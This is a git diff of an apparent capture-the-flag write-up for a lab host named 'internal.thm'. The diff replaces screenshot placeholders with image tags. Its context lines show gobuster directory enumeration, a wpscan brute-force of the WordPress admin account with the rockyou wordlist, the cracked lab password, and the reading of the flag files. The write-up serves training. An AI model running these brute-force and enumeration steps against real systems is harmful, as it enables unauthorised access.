@@ -62,7 +62,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 gobuster dir -u internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-[SCREEN01]
+<img width="888" height="405" alt="SCREEN01" src="https://github.com/user-attachments/assets/ddecaa90-efb5-4d35-a663-3efa752dfa90" />
 
 4. Navigate to `http://internal.thm/blog` and enumerate users. Visiting `http://internal.thm/blog/index.php/author/admin/` confirms the existence of a user account named `admin`.
 
@@ -72,7 +72,7 @@ gobuster dir -u internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.
 gobuster dir -u internal.thm/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-[SCREEN02]
+<img width="866" height="368" alt="SCREEN02" src="https://github.com/user-attachments/assets/edef31d9-ae8b-4580-87c8-f9ff8776704f" />
 
 6. Execute a password attack against the identified admin account using wpscan with the rockyou wordlist.
 
@@ -80,7 +80,7 @@ gobuster dir -u internal.thm/blog -w /usr/share/wordlists/dirbuster/directory-li
 wpscan --url internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
 ```
 
-[SCREEN03]
+<img width="1010" height="112" alt="SCREEN03" src="https://github.com/user-attachments/assets/a117d02b-26d8-4f27-9565-3bb3e0a3edc6" />
 
 **Results**: Valid credentials discovered - `admin:my2boys`
 
@@ -136,7 +136,7 @@ cd /home/aubreanna
 cat user.txt
 ```
 
-[SCREEN04]
+<img width="282" height="97" alt="SCREEN04" src="https://github.com/user-attachments/assets/4007a58c-deec-4bf4-80c3-dcfc4dc0e195" />
 
 ---
 
@@ -204,4 +204,4 @@ ls
 cat root.txt
 ```
 
-[SCREEN06]
+<img width="523" height="92" alt="SCREEN06" src="https://github.com/user-attachments/assets/31de61ad-87bf-456b-8592-e5f5ffcb8ca1" />
